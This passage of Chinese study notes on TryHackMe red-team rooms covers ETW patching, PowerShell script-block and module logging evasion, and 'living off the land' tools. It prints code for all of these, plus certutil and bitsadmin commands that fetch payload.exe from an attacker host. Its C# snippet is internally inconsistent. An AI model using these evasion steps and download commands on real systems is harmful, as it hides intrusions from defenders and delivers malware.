<figure class="shiki c#"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 获取 EtwEvenetWrite 地址</span></span>
<span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ntdll</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">LoadLibrary</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ntdll.dll&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">ntdll</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;EtwEventWrite&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 修改内存区域的权限</span></span>
<span class="line"><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oldProtect</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">VirtualProtect</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	(</span><span style="color: #E5C07B">UIntPtr</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">patch</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">out</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oldProtect</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 写入我们准备好的 opcode</span></span>
<span class="line"><span style="color: #61AFEF">patch</span><span style="color: #ABB2BF">(new </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] { </span><span style="color: #D19A66">0xc2</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x14</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF"> });</span></span>
<span class="line"><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">patch</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">etwEventSend</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">patch</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 恢复内存区域的权限</span></span>
<span class="line"><span style="color: #61AFEF">VirtualProtect</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">oldProtect</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">oldOldProtect</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 刷新指令缓存</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 强制 CPU 丢弃旧的函数指令，以确保补丁能够立即生效</span></span>
<span class="line"><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">FlushInstructionCache</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">etwFunction</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<h3 id="组策略">组策略</h3>
<p><strong>ETW 提供了强大的日志功能，但并非所有功能都默认开启。</strong> 为了避免生成海量日志，一些高频度记录的功能（如 PowerShell 日志）需要通过 <strong>GPO（组策略）</strong> 明确启用。</p>
<p>模块日志记录和脚本块日志记录提供程序都通过组策略启用，具体为 <code>Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell</code> 。同样的，系统程序集也是和用户同级加载的，所以可以通过反射修改 PowerShell 提供程序的组策略。</p>
<p>具体步骤如下：</p>
<ol>
<li>从实用程序缓存中获取组策略设置。</li>
<li>修改通用提供程序为 0。</li>
<li>修改调用或模块定义。</li>
</ol>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># ====================================================================</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># PowerShell 日志记录规避脚本</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 目的：通过修改 PowerShell 的组策略设置，来禁用或减少 ETW 日志。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 该脚本使用反射技术，直接操作内存中的私有字段。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># ====================================================================</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 第 1 步：使用反射获取组策略设置的私有字段</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># --------------------------------------------------------------------</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取 &quot;System.Management.Automation.Utils&quot; 类型的引用。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 该类型包含了我们想要修改的私有字段。</span></span>
<span class="line"><span style="color: #E06C75">$UtilsType</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.Utils&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 通过反射，获取名为 &quot;cachedGroupPolicySettings&quot; 的私有静态字段。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这个字段存储了 PowerShell 当前加载的组策略设置。</span></span>
<span class="line"><span style="color: #E06C75">$cachedGroupPolicySettingsField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$UtilsType.GetField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;cachedGroupPolicySettings&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 获取该字段的当前值。$null 用于获取静态字段的值。</span></span>
<span class="line"><span style="color: #E06C75">$GroupPolicySettings</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$cachedGroupPolicySettingsField.GetValue</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 第 2 步：修改脚本块日志（事件 ID 4104）设置</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># --------------------------------------------------------------------</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 将 &quot;EnableScriptBlockLogging&quot; 的值设为 0。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这会禁用脚本块日志记录，从而阻止记录完整的脚本内容。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这对攻击者最重要，因为它可以隐藏恶意脚本。</span></span>
<span class="line"><span style="color: #E06C75">$GroupPolicySettings</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;ScriptBlockLogging&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;EnableScriptBlockLogging&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 第 3 步：修改模块日志（事件 ID 4103）设置</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># --------------------------------------------------------------------</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 将 &quot;EnableScriptBlockInvocationLogging&quot; 的值设为 0。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这会禁用模块日志记录，从而阻止记录命令调用和参数。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 由于 4103 日志通常非常多，禁用它可以减少噪音，使攻击者活动更难被发现。</span></span>
<span class="line"><span style="color: #E06C75">$GroupPolicySettings</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;ScriptBlockLogging&#39;</span><span style="color: #ABB2BF">][</span><span style="color: #98C379">&#39;EnableScriptBlockInvocationLogging&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span></code></pre></div></div></figure>
<p>同样用这个命令来测试是否生效</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 4104 Event ID 的日志条目</span></span>
<span class="line"><span style="color: #56B6C2">Get-WinEvent</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">FilterHashtable </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">ProviderName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;Microsoft-Windows-PowerShell&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">Id</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">4104</span><span style="color: #ABB2BF">} | Measure | </span><span style="color: #C678DD">%</span><span style="color: #ABB2BF"> Count</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 从指定的日志文件中，找出所有目标端口为 4444 的网络连接事件</span></span>
<span class="line"><span style="color: #56B6C2">Get-WinEvent</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path C:\Users\THM</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">FilterXPath </span><span style="color: #98C379">&#39;*/System/EventID=3 and */EventData/Data[@Name=&quot;DestinationPort&quot;] and */EventData/Data=4444&#39;</span></span></code></pre></div></div></figure>
<h3 id="滥用日志管道">滥用日志管道</h3>
<p>在 PowerShell 中，每个模块或管理单元（snap-in）都有一个可供任何人使用的设置，用于修改其日志记录功能。根据微软文档，“当 <code>LogPipelineExecutionDetails</code> 属性值为 <code>TRUE</code>（<code>$true</code>）时，Windows PowerShell 会将该会话中的 cmdlet 和函数执行事件写入事件查看器中的 PowerShell 日志。”攻击者可以在任何 PowerShell 会话中将此值更改为 <code>$false</code>，以禁用该特定会话的模块日志记录。微软文档甚至指出了从用户会话中禁用日志记录的能力：“要禁用日志记录，请使用相同的命令序列将属性值设置为 <code>FALSE</code>（<code>$false</code>）。”</p>
<p>从宏观上看，日志管道技术可以分解为四个步骤：</p>
<ol>
<li>获取目标模块。</li>
<li>将模块的执行细节设置为 <code>$false</code>。</li>
<li>获取模块管理单元。</li>
<li>将管理单元的执行细节设置为 <code>$false</code>。</li>
</ol>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$module</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Get-Module</span><span style="color: #ABB2BF"> Microsoft.PowerShell.Utility </span><span style="color: #7F848E; font-style: italic"># 获取目标模块</span></span>
<span class="line"><span style="color: #E06C75">$module.LogPipelineExecutionDetails</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic"># 将模块的执行细节设置为 false</span></span>
<span class="line"><span style="color: #E06C75">$snap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Get-PSSnapin</span><span style="color: #ABB2BF"> Microsoft.PowerShell.Core </span><span style="color: #7F848E; font-style: italic"># 获取目标 ps-snapin</span></span>
<span class="line"><span style="color: #E06C75">$snap.LogPipelineExecutionDetails</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic"># 将 ps-snapin 的执行细节设置为 false</span></span></code></pre></div></div></figure>
<p>上述脚本块可以附加到任何 PowerShell 脚本中，或在会话中运行，以禁用当前已导入模块的日志记录。</p>
<h2 id="实践-5">实践</h2>
<p>随便执行一个绕过方法，因为都是注入到当前的 PowerShell 进程里面的，所以不会影响环境，然后去日志查看器里面清理一下 PowerShell 的操作日志就行了。</p>
<h1>Living Off the Land 土生土长</h1>
<p>这个房间名称有意思，实际教的内容也是很相关的，他教我们利用系统内置的应用达成我们的目的，这在渗透环境中是非常有用的，因为如果从我们的环境里面拉工具下来风险挺大的，利用内置的工具就相当于就地取材了</p>
<h2 id="Windows-Sysinternals">Windows Sysinternals</h2>
<p>Windows Sysinternals 是一套工具和高级系统实用程序，旨在帮助 IT 专业人员在各种高级主题中管理、排查和诊断 Windows 操作系统。</p>
<p>以下是一些常用的 Windows Sysinternals 工具：</p>
<table>
<thead>
<tr>
<th><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a></th>
<th>Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services.</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a></td>
<td>A tool that executes programs on a remote system.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a></td>
<td>An advanced Active Directory tool that helps to easily view and manage the AD database.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></td>
<td>Monitors running processes for CPU spikes and the ability to dump memory for further analysis.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">ProcMon</a></td>
<td>An essential tool for process monitoring.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview">TCPView</a></td>
<td>A tool that lists all TCP and UDP connections.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">PsTools</a></td>
<td>The first tool designed in the Sysinternals suite to help list detailed information.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon">Portmon</a></td>
<td>Monitors and displays all serial and parallel port activity on a system.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois">Whois</a></td>
<td>Provides information for a specified domain name or IP address.</td>
</tr>
</tbody>
</table>
<p>有关 Sysinternals 套件的更多信息，您可以<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">在此</a>访问 Microsoft Docs 上该工具的网页.</p>
<h3 id="在线-Sysinternals">在线 Sysinternals</h3>
<p>Windows Sysinternals 的一个重要特点是无需安装。微软提供了一个 Windows Sysinternals 服务——Sysinternals Live，提供多种使用和运行这些工具的方式。我们可以通过以下方式访问和使用它们</p>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://live.sysinternals.com/">https://live.sysinternals.com/</a></p>
</li>
<li>
<p><code>\\live.sysinternals.com\tools</code></p>
</li>
</ul>
<p>如果你有兴趣进一步了解 Windows Sysinternals，我们建议你熟悉以下额外资源：</p>
<ol>
<li>TryHackMe room: <a target="_blank" rel="noopener" href="https://tryhackme.com/room/btsysinternalssg">Sysinternals</a>.</li>
<li>Microsoft Sysinternals Resources <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/resources/">website</a>.</li>
</ol>
<h2 id="LOLBAS-项目">LOLBAS 项目</h2>
<p>LOLBAS 代表 “利用本地二进制文件和脚本生存”（Living Off the Land Binaries And Scripts）。该项目的主要目标是收集并记录由微软签名并内置的、作为“利用本地资源”技术使用的工具，包括二进制文件、脚本和库。</p>
<p>LOLBAS 项目是一个由社区驱动的资料库，收集了可用于红队用途的二进制文件、脚本和库。它允许基于二进制文件、函数、脚本和 ATT&amp;CK 信息进行搜索。上图显示了目前 LOLBAS 项目页面的样貌。如果你想了解更多关于该项目的详细信息，可以访问该项目的官网：<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p>
<p>LOLBAS 网站提供了一个方便的搜索栏来查询所有可用数据。直接搜索二进制文件很简单；包含二进制名称即可显示结果。然而，如果我们想查找特定函数，则需要在函数名前加上 /。例如，如果我们要查找所有执行函数，应使用 /execute 同样，为了基于类型进行查找，我们应使用 # 符号后跟类型名称。以下是项目中包含的类型：</p>
<ul>
<li>Script 脚本</li>
<li>Binary 二进制</li>
<li>Libraries 库</li>
<li>OtherMSBinaries 其他 MS 二进制文件</li>
</ul>
<h3 id="Tools-Criteria-工具标准">Tools Criteria 工具标准</h3>
<p>要被认定为“原生系统工具（Living Off the Land）”技巧并被纳入 LOLBAS 项目，工具必须满足特定标准：</p>
<ul>
<li>由微软签名、属于操作系统原生或从微软下载的文件。</li>
<li>具有额外的、有趣的、未按已知用例覆盖的非预期功能。</li>
<li>对高级持续性威胁（APT）或红队活动有利。</li>
</ul>
<p>如果你发现了符合上面条件的二进制文件，可以去他的 repo 里面贡献一下。</p>
<h3 id="Interesting-Functionalities-有趣的功能">Interesting Functionalities 有趣的功能</h3>
<p>LOLBAS 项目接受符合以下功能之一的工具提交：</p>
<ul>
<li>Arbitrary code execution 任意代码执行</li>
<li>File operations, including downloading, uploading, and copying files.<br>
文件操作，包括下载、上传和复制文件。</li>
<li>Compiling code 正在编译代码</li>
<li>Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.<br>
持久性，包括在替代数据流（ADS）中隐藏数据或在登录时执行。</li>
<li>UAC bypass UAC 绕过</li>
<li>Dumping process memory 转储进程内存</li>
<li>DLL injection DLL 注入</li>
</ul>
<h2 id="文件操作">文件操作</h2>
<p>本任务将重点介绍一些有趣的“借助现有系统工具（Living Off the Land）”技术，这些技术旨在用于文件操作，包括下载、上传和编码。</p>
<h3 id="Certutil">Certutil</h3>
<p>Certutil 是 Windows 内置的证书服务工具，该工具的正常用途是检索证书信息。人们发现 certutil.exe 可以传输和编码与证书服务无关的文件。MITRE ATT&amp;CK 框架将该技术标识为入口工具传输（<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1105/">T1105</a>）</p>
<p>为了说明这一点，我们可以举个例子：使用 <code>certutil.exe</code> 从攻击者的 Web 服务器下载文件并将其存储在 Windows 的临时文件夹中，使用下面的命令：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">certutil</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">URLcache</span><span style="color: #ABB2BF"> -</span><span style="color: #56B6C2">split</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> http://</span><span style="color: #E06C75">Attacker_IP</span><span style="color: #ABB2BF">/payload.exe C:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Temp</span><span style="color: #ABB2BF">\payload.exe</span></span></code></pre></div></div></figure>
<ul>
<li>-urlcache 显示 URL，启用命令中可使用的 URL 选项</li>
<li>-split -f 用于从提供的 URL 拆分并强制获取文件</li>
</ul>
<p>此外，certutil.exe 可用作编码工具，我们可以用它对文件进行编码并解码文件内容。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">certutil</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">encode</span><span style="color: #ABB2BF"> payload.exe </span><span style="color: #E06C75">Encoded</span><span style="color: #ABB2BF">-payload.txt</span></span>
<span class="line"><span style="color: #ABB2BF"># 解码</span></span>
<span class="line"><span style="color: #E06C75">certutil</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">decode</span><span style="color: #ABB2BF"> enc_thm_0YmFiOG_file.txt plain.txt</span></span></code></pre></div></div></figure>
<p>更多信息可以参考：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Microsoft Docs: CertUtil</a></p>
<h3 id="BITSAdmin">BITSAdmin</h3>
<p><code>bitsadmin</code> 工具是一个系统管理员实用程序，可用于创建、下载或上传后台智能传输服务（BITS）任务并检查其进度。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">BITS</a> 是一种用于从 HTTP 网络服务器和 SMB 服务器下载和上传文件的低带宽、异步方法。</p>
<p>攻击者可能滥用 BITS 任务在被入侵的机器上下载并执行恶意 payload。有关该技术的更多信息，您可以访问 ATT&amp;CK <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1197/">T1197</a> 页面。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">bitsadmin.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">transfer</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">Download</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">priority</span><span style="color: #ABB2BF"> Foreground http://</span><span style="color: #D19A66">10.6.4.118</span><span style="color: #ABB2BF">/payload.exe c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">\payload.exe</span></span></code></pre></div></div></figure>
<ul>
<li>/Transfer 使用转移选项</li>
<li>/Download 我们正在使用下载类型指定传输</li>
<li>/Priority 优先级设置为在前台运行</li>
</ul>
<p>有关 bitsadmin 工具的更多信息，请参阅 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin">Microsoft Docs</a>。</p>
<h3 id="FindStr">FindStr</h3>
<p>使用 findstr.exe 从网络内的 SMB 共享文件夹下载远程文件，方法如下</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">findstr</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">V</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">dummystring</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">MachineName</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ShareFolder</span><span style="color: #ABB2BF">\test.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> &gt;</span><span style="color: #E06C75"> c</span><span style="color: #ABB2BF">:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Temp</span><span style="color: #ABB2BF">\test.exe</span></span></code></pre></div></div></figure>
<ul>
<li><code>/V</code> 打印出不包含所提供字符串的行。</li>
<li><code>dummystring</code> 要搜索的文本；在这种情况下，我们提供一个不得在文件中出现的字符串。</li>
<li><code> &gt; c:\Windows\Temp\test.exe</code> 将输出重定向到目标机器上的一个文件。</li>
</ul>
<p>请注意，其他工具也可用于该文件操作。我们建议访问 <a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS</a> 以查看它们。</p>
<h2 id="文件执行">文件执行</h2>
<p>除了常见的如通过命令行 <code>cmd.exe</code> 或桌面快捷方式启动之外，攻击者还会滥用合法的系统二进制文件来执行载荷。</p>
<p>这种方法被称为 <strong>“已签名二进制代理执行”（Signed Binary Proxy Execution）</strong> 或 <strong>“间接命令执行”（Indirect Command Execution）</strong>。根据 MITRE ATT&amp;CK 框架，这种技术的核心是利用操作系统自带的、通常被认为是“可信”的工具来生成并执行恶意载荷。</p>
<p>这样做有两个主要目的：</p>
<ol>
<li><strong>隐藏恶意载荷的进程</strong>：使恶意活动看起来像是合法的系统进程。</li>
<li><strong>规避安全防御</strong>：利用这些已签名的、白名单内的系统工具，可以有效绕过安全产品的检测和防御。</li>
</ol>
<h3 id="File-Explorer">File Explorer</h3>
<p>文件资源管理器是 Windows 的文件管理器和系统组件。人们发现使用文件资源管理器的可执行文件可以执行其他 .exe 文件。这种技术称为间接命令执行（Indirect Command Execution），即可以利用并滥用 explorer.exe 工具从受信任的父进程启动恶意脚本或可执行文件。</p>
<p>explorer.exe 二进制文件位于：</p>
<ul>
<li>C:\Windows\explorer.exe for the Windows 64-bit version.</li>
<li>C:\Windows\SysWOW64\explorer.exe for the Windows 32-bit version.</li>
</ul>
<p>为了以 explorer.exe 作为父进程创建子进程，我们可以执行以下命令：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">explorer.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">root</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;C:\Windows\System32\calc.exe&quot;</span></span></code></pre></div></div></figure>
<h3 id="WMIC">WMIC</h3>
<p>Windows Management Instrumentation (WMIC) 是一个管理 Windows 组件的命令行工具。有人发现 WMIC 也被用于执行二进制文件以规避防御措施。MITRE ATT&amp;CK 框架将该技术称为签名二进制代理执行 (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/">T1218</a>)</p>
